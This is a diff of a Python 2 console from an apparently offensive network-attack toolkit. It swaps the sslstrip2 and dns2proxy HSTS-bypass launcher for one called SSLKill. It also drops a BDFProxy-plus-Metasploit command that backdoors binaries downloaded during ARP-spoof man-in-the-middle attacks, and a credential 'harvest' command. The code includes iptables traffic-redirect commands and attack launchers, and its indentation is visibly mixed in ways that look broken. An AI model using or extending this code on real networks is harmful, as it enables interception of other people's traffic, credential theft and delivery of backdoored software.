@@ -28,7 +28,7 @@ import os,sys
 import termcolor
 import readline
 import psutil
-
+from time import sleep
 class Processor(object):
 	name = "Interface-Processor"
 	desc = "Console to process commands"
@@ -66,9 +66,7 @@ class Processor(object):
 		self.icmpsmurf_status = 0
 		self.dhcpstarvation_status = 0
 		self.teardrop_status = 0
-		self.sslstrip_status = False
-		self.dns2proxy_status = False
-		self.bdfproxy_status = False
+		self.sslkill_status = False
 
 		# Recursive "shell=True" process killing
 	def pskill(self, proc_pid):
@@ -109,80 +107,40 @@ class Processor(object):
 						print "[*] User requested shutdown."
 						if self.dnsdrop_status == 1:
 							self.dos.dnsdropstop()
-						if self.sslstrip_status == True:
+						if self.sslkill_status == True:
 							self.pskill(self.p1.pid)
-							print "[*] SSLstrip finalized."
-						if self.dns2proxy_status == True:
-							self.pskill(self.p2.pid)
-							print "[*] DNS2Proxy finalized."
+							print "[*] SSLKill finalized."
+					                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+                					os.system('iptables -t nat -F')
 						if self.arpspoof_status == True:
 							iptables()
 							set_ip_forwarding(0)
 						exit()
 
-					elif self.command == "bdfproxy":
-						if self.dns2proxy_status == True or self.sslstrip_status == True:
-							print "[!] BDFProxy can't run with hstsbypass."
-							continue
-						if self.arpspoof_status:
-							try:
-								os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")
-								os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080")
-								with open("{}/log/bdfproxy.log".format(self.path), "a+") as stdout:
-									self.p1 = subprocess.Popen(["python {}/third-party/BDFProxy/bdf_proxy.py".format(self.path),"bdfproxy"],shell=True, stdout=stdout, stderr=stdout)
-								print "[+] BDFProxy initialized"
-								print "	 |_by: Joshua Pitts"
-								self.bdfproxy_status = True
-								print "[*] Starting Metasploit."
-								print "		|_by: rapid7"
-								os.system("service postgresql start")
-								os.system("msfdb init")
-								os.system("msfconsole bdfproxy_msf_resource.rc")
-							except Exception as e:
-								print "[!] Exception caught: {}".format(e)
-						else:
-							print "[!] You need to start an ARP spoof attack first."
-					elif self.command == "bdfproxy help":
-						print "\n[Help] Start to patch backdoors inside binary downloads while man-in-the-middleing with BDFProxy + Metasploit combo."
-						print "[Required] ARP spoofing started."
-						print "example:"
-						print "{} arpspoof start".format(console)
-						print "{} bdfproxy\n".format(console)
-
-
 						# HSTSBYPASS
 					elif self.command == "hstsbypass":
-
-						if self.arpspoof_status:
+						if self.targets and self.gateway and self.interface:
 							try:
-									#iptables redirect traffic to port that sslstrip are listening
-	                                                        os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8000")
-								os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8000")
-									#iptables redirect traffic to port that dns2proxy are listening
-								os.system("iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53")
-
-								#Start subprocess with shell=True with sslstrip2 and dns2proxy
-					               	       	with open("{}/log/sslstrip.log".format(self.path), "a+") as stdout:
-        	                       					self.p1 = subprocess.Popen(["python {}/third-party/sslstrip2/sslstrip.py -l 8000".format(self.path),"sslstrip"], shell=True, stdout=stdout, stderr=stdout)
-									self.sslstrip_status = True
-								with open("{}/log/dns2proxy.log".format(self.path),"a+") as stdout:
-									self.p2 = subprocess.Popen(["python {}/third-party/dns2proxy/dns2proxy.py".format(self.path),"dns2proxy"], shell=True, stdout=stdout, stderr=stdout)
-									self.dns2proxy_status = True
-								print "[*] SSLstrip+ initialized"
-								print "      |_by: LeonardoNve && M.Marlinspike"
-								print "[*] DNS2Proxy initialized"
-								print "      |_by: LeonardoNve"
+								#Start subprocess with shell=True with sslkill
+					               	       	with open("{}/log/sslkill.log".format(self.path), "a+") as stdout:
+        	                       					self.p1 = subprocess.Popen(["python {}/modules/sslkill.py -i {} -t {} -g {}".format(self.path, self.interface, self.targets, self.gateway),"sslkill"], shell=True, stdout=stdout, stderr=stdout)
+									self.sslkill_status = True
+								print "[*] SSLKill initialized"
+								print "      |_by: m4n3dw0lf"
 							except Exception as e:
 								print "[!] Exception caught: {}".format(e)
+
 						else:
-							print "[!] You need to start an ARP spoof attack first."
+							print "[!] You need to set a target, interface and gateway before starting SSLKill."
 
 
 					elif self.command == "hstsbypass help":
-						print "\n[Help] Start to perform a HSTS Bypass with dns2proxy and SSL strip with sslstrip+"
-						print "[Required] ARP spoofing started."
+						print "\n[Help] Start to perform a HSTS Bypass with SSLKill"
+						print "[Required] Interface, Gateway and Target"
 						print "example:"
-						print "{} arpspoof start".format(console)
+						print "{} set interface eth0".format(console)
+						print "{} set gateway 10.0.0.1".format(console)
+						print "{} set target 10.0.0.3".format(console)
 						print "{} hstsbypass\n".format(console)
 
 
@@ -913,14 +871,6 @@ class Processor(object):
 							print "[!] Exception caught: {}".format(e)
 							pass
 
-					elif self.command == "harvest":
-						try:
-							credentials_harvest(self.file)
-						except KeyboardInterrupt:
-							pass
-						except Exception as e:
-							print "[!] Exception caught: {}".format(e)
-							pass
 
 					elif self.input_list[0] == "decode":
 						try:
@@ -1074,12 +1024,11 @@ class Processor(object):
 			print "\n[*] User requested shutdown."
 			if self.dnsdrop_status == 1:
 				self.dos.dnsdropstop()
-			if self.sslstrip_status == True:
+			if self.sslkill_status == True:
 				self.pskill(self.p1.pid)
-				print "[*] SSLstrip finalized."
-			if self.dns2proxy_status == True:
-				self.pskill(self.p2.pid)
-				print "[*] DNS2Proxy finalized."
+				print "[*] SSLKill finalized."
+                                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+                                os.system('iptables -t nat -F')
 			if self.arpspoof_status == True:
 				iptables()
 				set_ip_forwarding(0)
